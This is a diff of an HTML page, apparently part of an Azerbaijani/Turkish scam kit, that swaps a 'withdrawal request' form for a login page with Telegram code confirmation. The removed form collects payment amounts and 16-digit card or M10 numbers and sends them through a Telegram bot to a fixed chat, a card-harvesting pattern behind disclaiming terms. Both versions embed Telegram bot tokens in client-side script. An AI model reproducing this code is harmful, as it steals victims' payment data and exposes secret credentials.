@@ -1,42 +1,19 @@
 <!DOCTYPE html>
-<html lang="tr">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Çıxarış göndər</title>
+    <title>Login Sayfası</title>
     <style>
         body {
+            margin: 0;
+            padding: 0;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            margin: 0;
-            background: linear-gradient(45deg, #838588, #007bff);
-        }
-        .container {
-            width: 350px;
-            padding: 100px 20px;
-            position: relative;
-            top: -60px;
-            overflow: hidden;
-            border: 1px solid hsl(0, 0%, 80%, 0);
-            box-shadow: 0 0 10px 1px rgba(0, 0, 0, 0.7);
-            text-align: center;
-            background-color: hsla(202, 41%, 35%, 0.3);
-            backdrop-filter: blur(13px);
-            border-radius: 20px;
-        }
-        .container h1{
-            color: hsla(0, 23%, 97%, 0.6);
-            border-bottom: 4px solid #333;
-            margin-top: -80px;
-            margin-bottom: 60px;
-            transition: 0.3s;
-        }
-        .container h1:hover{
-            color: hsla(0, 23%, 97%, 1);
-            transform: scale(1.01);
-            transition: 0.3s;
+            background-color: hsla(0, 9%, 93%, 0.2);
+            
         }
         img{
             z-index: -1;
@@ -48,204 +25,200 @@
             left: 50%; /* Soldan ortala */
             transform: translate(-50%, -50%); /* Gerçekten ortala */
         }
-        input[type="text"] {
-            width: 80%;
-            padding: 10px;
-            margin: 10px;
-            border: 1px solid hsl(0, 0%, 24%, 0.0);
-            border-bottom: 0px solid rgba(0, 0, 0, 1);
-            background-color: hsla(0, 0%, 80%, 0.0);
-            color: #000;
-            font-size: 17px;
-            border-radius: 7px 7px 0px 0px;
-            box-shadow: 0px 0px 0px 0px #333;
-            transition: 0s;
-        }
-        input[type="text"]:hover{
-            border-bottom: 1.5px solid rgba(0, 0, 0, 1);
-            box-shadow: 0px 0px 10px 1px #333;
-            color: #fff;
-            transition: 0.1s;
-        }
-        input::placeholder{
-            color: #ffffff;
-            opacity: 0.8;
-            transition: 0s;
-            text-shadow: 0px 0px 5px #000;
-        }
-        input:hover::placeholder{
-            color: #FFF;
-            opacity: 0.99;
-            transition: 0.5;
-        }
-        button {
-            padding: 10px 100px;
-            margin: 50px 10px;
-            margin-bottom: 0px;
-            background-color: hsl(0, 0%, 0%, 0.01);
-            color: hsla(0, 9%, 94%, 0.6);
-            text-shadow: 0px 0px 40px #121, 0px 0px 40px #222, 0px 0px 70px #222;
-            border: 1 px solid hsl(0, 0%, 24%, 0.0);
-            border-radius: 15px;
-            cursor: pointer;
-            font-size: 19px;
-            box-shadow: 0px 0px 15px 0.5px #000;
-            transition: 200ms linear;
-        }
-        button:hover {
-            background-color: #0056b3;
-            box-shadow: 0px 0px 10px 1px #000,
-                        inset -1px -1px 3px 1px #000;
-            color: hsl(0, 0%, 100%, 1);
-            
-            }
-
-        .messageBox{
-            position: absolute;
-            top: 300px;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 250px;
-            padding: 20px;
-            background-color: rgba(0, 0, 0, 0.8);
-            color: white;
-            font-size: 16px;
+        .login-container {
+            background-color: hsla(0, 0%, 100%, 0.1);
+            backdrop-filter: blur(11px);
+            padding: 40px;
             border-radius: 10px;
-            display: none;
+            box-shadow: 0 0 10px rgba(0, 0, 0);
+            width: 300px;
+            height: 500px;
+            text-align: center;
         }
-        .x_btn{
-            color: #FFF;
-            position: fixed;
-            top: 0px;
-            right: 12px;
-            font-size: 25px;
-            cursor: pointer;
+        .login-container h1 {
+            margin-bottom: 60px;
+            margin-top: 25%;
+            color: rgb(198, 198, 198);
+            font-weight: 700;
+            font-size: 40px;
         }
-        .YesNo{
-            display: block;
-            cursor: pointer;
-            font-size: 70px;
-            
-            
-        }
-        .YesNo_box{
-            position: absolute;
+        .login-container div{
             display: flex;
-            width: 200px;
-            padding-left: 35%;
-            background-color: rgba(0, 0, 0, 0.0);
-            color: white;
-            opacity: 0.9;
-            font-size: 15px;
-            border-radius: 5px;
-            text-shadow: 0px 0px 10px #000;
         }
-        
-
-
-        .InfoBox{
-            position: absolute;
-            top: 81%;
-            background-color: hsl(0, 0%, 0%, 0.7);
-            backdrop-filter: blur(3px);
-            width: 100%;
-            height: auto;
-            box-shadow: 0px 0px 10px 1px ;
-            
-        }
-        .InfoBox *{
-            text-shadow: 0px 0px 10px #333;
-            color: #ccc;
-            padding-right: 15px;
-            padding-left: 15px;
-        }
-        .message_box{
-            margin-top: 50px;
-            background-color: hsla(0, 23%, 97%, 0.1);
-            width: 290px;
-            height: 60px;
-            border-radius: 10px;
+        .login-container div input[type="text"] {
+            display: flex;
+            width: 90%;
             padding: 10px;
-            color: #000;
-            border: 1px solid #000;
-            box-shadow: 0px 0px 5px 0.1px hsl(0, 0%, 0%);
-            transition: 0.2s;
-
+            margin-left: -9px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            border: none;
+            border-bottom: 1px solid #ccc;
         }
-        .message_box:hover{
-            color: #fff;
+        .login-container div input[type="text"]:hover{
+            border-bottom: none;
+        }
+
+        .login-container div button a{
+            text-decoration: none;
+            color: black;
+            font-size: 15px;
+            text-shadow: 0px 0px 10px black, 0px 0px 10px blac;
+            font-weight: 700;
+        }
+        .login-container div button {
+            height: 40px;
+            margin-left: 20px;
+            margin-right: -10px;
+            width: 45%;
+            background-color: hsla(120, 100%, 99%, 0.328);
+            border: none;
+            border-radius: 10px;
+            transition: 0.15s;
+        }
+        .login-container div button:hover{
+            background-color: #3e7c41;
+            transform: scale(1.03);
+        }
+
+        .login-container input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: none;
+            border-bottom: 1px solid #ccc;
+            border-radius: 5px;
+            background-color: hsla(127, 14%, 89%, 0.183);
+            transition: 0.2s;
+        }
+        .login-container input[type="text"]:hover{
+            background-color: hsla(127, 14%, 89%, 1);
+            border: 1px solid #ccc;
+        }
+        .login-container input[type="button"] {
+            width: 107%;
+            padding: 10px;
+            margin-top: 3%;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            background-color: hsla(120, 100%, 99%, 0.328);
+            transition: 0.2s;
+        }
+        .login-container input[type="button"]:hover {
+            background-color: #3e7c41;
             transform: scale(1.03);
             transition: 0.2s;
         }
-        .message_box::placeholder{
-            color: hsla(148, 30%, 92%, 0.881);
-            text-shadow: 0px 0px 10px #333;
+        .ip-div{
+            width: 100%;
+            padding: 0;
+            margin: 0;
+            padding: 10px;
+            padding-bottom: 5px;
+            margin-bottom: 10px;
         }
-        .message_box:hover::placeholder{
-            color: hsl(0, 0%, 100%, 1);
-            transition: 0.3s;
+        .login-container input[type="text"]::placeholder{
+            color: #e1dede;
+            font-size: 15px;
         }
-        .Onay_content{
-            display: flex;
+        .login-container input[type="text"]:hover::placeholder{
+            color: black;
+        }
+        #message_box{
+            display:flex;
+            justify-content: center;
+            align-items: center;
+            position: absolute;
+            background-color: hsla(0, 0%, 0%, 0.918);
+            color: #FFF;
+            width: 340px;
+            height: 230px;
+            border: none;
+            border-radius: 20px;
+            display: none;
+            transition: 0.3s ease-out;
+        }
+        #message_box h3{
+            margin-top: 70px;
+            margin-bottom: 5px;
             margin-left: 20px;
-            justify-content: space-between;
-            width: 300px;
-            background-color: rgba(0, 0, 0, 0.1);
-            color: white;
-            border-radius: 10px;
-            text-align: center;
+            font-size: 17px;
         }
+        
+        .x_btn{
+            position: absolute;
+            top: -20px;
+            right: 10px;
+            font-size: 20px;
+            cursor: pointer;
+            transition: 170ms;
+            transform-style: preserve-3d;
+        }
+        .x_btn:hover{
+            transform: rotate(90deg);
+        }
+        #id_info{
+            position: relative;
+            display: fixed;
+            right: 7%;
+            top: -18px;
+            cursor: pointer;
+            transition: 0.2s;
+            font-size: auto;
+        }
+        #id_info:hover{
+            color: #e4e4eb;
+        }
+    
+       
     </style>
-
-
-
 </head>
 <body>
+    <img src="https://i.pinimg.com/originals/f1/2f/08/f12f0841ba00d7679a012975a472f89f.jpg" alt = "Fotoraf bulunmadı">
 
-
-    <img src="https://wallpapercave.com/wp/wp9589672.jpg" alt = "Fotoraf bulunmadı">
-    
-    <div class="container">
-        <h1>Çıxarış isdəyi göndər.</h1>
-        <input type="text" class="text" id = "Entry_money" placeholder="Çıxarış məbləgi">
-        <input type="text" class="text" id = "Entry_kod" placeholder="M10 & 16 rəgəmli Kart kodu">
-        <div class="Onay_content" id = "Onay_content">
-        </div>
-        <textarea class="message_box" id="message_box" placeholder="Zəhmət olmasa, əməliyyatla bağlı əlavə qeydinizi və ya istəyinizi bura yazın. Sizə kömək etməyimiz üçün vacib hesab etdiyiniz detalları paylaşa bilərsiniz."></textarea>
-        <label class="YesNo_box"><input type="checkbox" id="checkbox" class="YesNo"><u>Çıxarış şərtlərini oxunudum</u></label>
-        <button onclick="mesajGonder()">Isdəy gönder</button>
+    <div class="login-container" id="container">
+        <h1>Giriş</h1>
+        <form action="onay.html" method="post">
+            <div class="ip-div">
+                <input type="text" id="id_entry" name="ip-address" placeholder="IP Adresini Girin" required>
+                <h4 id="id_info"><span  onclick="Info_id()">&#9432</span></h4>
+                <button type="button" onclick="kod_al()"><a href="#">kod al</a></button>
+            </div>
+            <input type="text" id="kod_entry" name="onay-kodu" placeholder="Onay Kodunu Girin" required>
+            <input type="button" onclick="Giris()" value="Kod gödər" >
+        </form>
     </div>
-
-
-    <div class = "messageBox" id="Sms_box">
-        <h4 class="x_btn" id="X_btn"><span onclick="Off_message_box()">&#10006</span></h4>
-        <h3>Mesaj:</h3>
-        <p id="messageBoxContent">Error</p>
+    <div id="message_box">
+        <h4 class="x_btn" onmouseout="off_mause()" onmouseover="on_mause()" id="X_btn"><span onclick="Off_message_box()">&#10006</span></h4>
+        <h3 id="error_sms">Message </h3>
     </div>
-
-    <div id="infoBox" class="InfoBox">
-        <h4>Para Gönderme Talebi</h4>
-        <h5>Şartlar:
-
-            Gönderim işlemi için yeterli bakiye olmalıdır. Yetersiz bakiye durumunda işlem onaylanmayacaktır.
-            
-            Girilen Kullanıcı ID'si ve kart / M10 numarası doğru olmalıdır. Yanlış girişlerde para iadesi yapılmayacaktır.
-            
-            Bu işlemle ilgili hiçbir hükümlülüğümüz yoktur.
-            
-            
-            </h5>
-            <h5><b>Not: Lütfen tüm bilgilerinizi dikkatlice kontrol ediniz.</b></h5>
-    </div>
-
-
-
     <script>
-        function Off_message_box(){
-            document.getElementById("Sms_box").style.display="none";
+        
+        message_box = document.getElementById("message_box");
+        function Off_message_box() {
+            message_box.style.display = "none";
+            
         }
-        function ID_dogrula(){
-            var user_id = localStorage.getItem("entry_id");
+        function on_mause() {
+            document.getElementById("message_box").style.border = '1px solid red';
+        }
+        function off_mause() {
+            document.getElementById("message_box").style.border = "0px solid red";
+        }
+
+        function Info_id() {
+            document.getElementById("message_box").style.display="block";
+            error_sms.innerHTML = "IP ünvanınız və onay kodunuz təhlükəsizlik məqsədilə tələb olunur. Onay kodu, hesabınıza yalnız sizin daxil olmağınızı təmin edir və əməliyyatları qoruyur. Bu kodu heç kimlə paylaşmayın; əks halda, məsuliyyət daşımırıq.";
+
+                
+        }
+        function kod_al(x = true){
+            const kod = document.getElementById('id_entry').value;
+            let user_id = kod.replace(/\s+/g, "")
             window.kod = Math.floor(Math.random() * 9000) + 1000; 
             mesaj = `Sizin çıxarış təsdiq kodunuz bu kodu heç kim ilə paylaşmayın! \nKod: ${window.kod}`
             fetch('https://api.telegram.org/bot7435782633:AAEp2NlpQLN0LuYWXPvtYuFGHYTrG8p_ouc/sendMessage', {
@@ -254,84 +227,69 @@
                     'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({
-                    chat_id: user_id,  // Sizin Chat ID'niz
-                    text: mesaj             // Entry'den alınan mesajı gönderiyoruz
+                    chat_id: user_id,
+                    text: mesaj            
                 })
             })
-            document.getElementById("Sms_box").style.display="block";
-            messageBoxContent.innerHTML = "tesdiy kodu göndərildi";
-        }
-        function mesajGonder() {
-            var user_id = localStorage.getItem("entry_id");
-            const miktar = document.getElementById('Entry_money').value;
-            const kod = document.getElementById('Entry_kod').value;
-            const user_not = document.getElementById("message_box").value;
-            var saat = new Date();
-            const mesaj = `ID: ${user_id} \nMəbləğ: ${miktar}AZN \nNumara: ${kod} \nNot:\n${user_not}\n\n${saat}`;
-            const User_mesaj = `Çıxarış isdəyi: \nMəbləğ: ${miktar}AZN \nNumara: ${kod} \nNot:\n${user_not}\n\n${saat}`;
-            
-                // Miktarın geçerli bir pozitif sayı olup olmadığını kontrol et
-                const miktarFloat = parseFloat(miktar);
-                if (isNaN(miktarFloat) || miktarFloat < 4 ) {
-                    messageBoxContent.innerHTML = "Keçeli bir məbləğ daxil et minumum çıxarış 4AZN təşkil edir.";
-                    document.getElementById("Sms_box").style.display="block";
-                    document.getElementById("Entry_money").value = ''
+            document.getElementById("message_box").style.display="block";
+            if (x && user_id.length > 6){
+                error_sms.innerHTML = "tesdiy kodu göndərildi";
+                return
+            };
+            if (user_id.length == 0){
+                error_sms.innerHTML = "İstifadəçi ID daxil edin";
+                return
+            };
 
-                    return;
-                }
-            
-                // Kodun boş olup olmadığını kontrol et
-                if (!kod.trim()) {
-                    messageBoxContent.innerHTML = "Kod boş olamaz. M10 & Kartın 16 rəqəmi";
-                    document.getElementById("Sms_box").style.display="block";
-                    document.getElementById("Entry_kod").value = ''
-
-                    return;
-                }
-
-                if (checkbox.checked) {
-                    messageBoxContent.innerHTML = "mesac ugurla gonderildi";
-                    document.getElementById("Sms_box").style.display="block";
-                    
-                }
-                else {
-                    messageBoxContent.innerHTML = "Şərtlər grbul olunmadı!";
-                    document.getElementById("Sms_box").style.display="block";
-                    return;
-                }
-
-            
-                // Mesaj geçerli ise burada işleme devam edebilirsiniz
-                message = `ID: ${user_id} \nMəbləğ: ${miktarFloat} \nKod: ${kod}`;
-                messageBoxContent.innerHTML = `ID: ${user_id} \nMəbləğ: ${miktarFloat} \n Kod: ${kod}`;
-                
-                document.getElementById("Entry_kod").value = ''
-                document.getElementById("Entry_money").value = ''
-                document.getElementById("message_box").value = ''
-                
-                var KOD_len = kod.length
-                if (!(KOD_len > 8)) {
-                    messageBoxContent.innerHTML = "Kaşlok kodu düzgün görsənmir!";
-                    document.getElementById("Sms_box").style.display="block";
-                    return;
-                }
-
-                messageBoxContent.innerHTML = `isdek gonderildi\n${message}`
-                document.getElementById("Sms_box").style.display="block";
-                // Telegram API'si üzerinden mesaj gönderme
-                fetch('https://api.telegram.org/bot7305999237:AAEZKowGcSZWf3btGW0dYOtT2TWlwpxXlzY/sendMessage', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        chat_id: '6726703804',  // Sizin Chat ID'niz
-                        text: mesaj             // Entry'den alınan mesajı gönderiyoruz
-                    })
-                
-                })
+            if (user_id.length < 6){
+                error_sms.innerHTML = "İstifadəçi ID sinin düzqünlüyünnən əmin olun";
+                return
             }
-
+            if (!x) {
+                error_sms.innerHTML = "Təsdiq kodu yanlışdır kod yenidən göndərildi";
+            };
+        }
+        
+        function get_app(){
+            setTimeout(function() {
+                const entry_id = document.getElementById("id_entry").value;
+                localStorage.setItem("entry_id", entry_id);
+                window.location.href = 'index-1.html'; // Hedef HTML sayfasının ismi
+            }, 1000); 
+        }
+        function Giris() {
+            const entry_id = document.getElementById('id_entry').value;
+            const entry_kod = document.getElementById('kod_entry').value;
+            var ID_len =  entry_id.length
+            if (!entry_id.trim()){
+                message_box.style.display = "block";
+                error_sms.innerHTML = "id daxil edin";
+                return;
+            }
+            if ((ID_len < 6)){
+                message_box.style.display = "block";
+                error_sms.innerHTML = "id duzgun daxil edin";
+                return;
+            }
+            if (!entry_kod.trim()){
+                message_box.style.display = "block";
+                error_sms.innerHTML = "Təsdiq kodu daxil edin kod telegraminiza gonderlildi!";
+                kod_al(false);
+                return;
+            }
+            if (kod == entry_kod){
+                message_box.style.display = "block";
+                error_sms.innerHTML = "kod onaylandi";
+                get_app();
+                return;
+            }
+            else {
+                message_box.style.display = "block";
+                error_sms.innerHTML = "Hatali onay kodu!";
+                kod_al(false)
+                return
+            }
+                }
     </script>
 </body>
 </html>
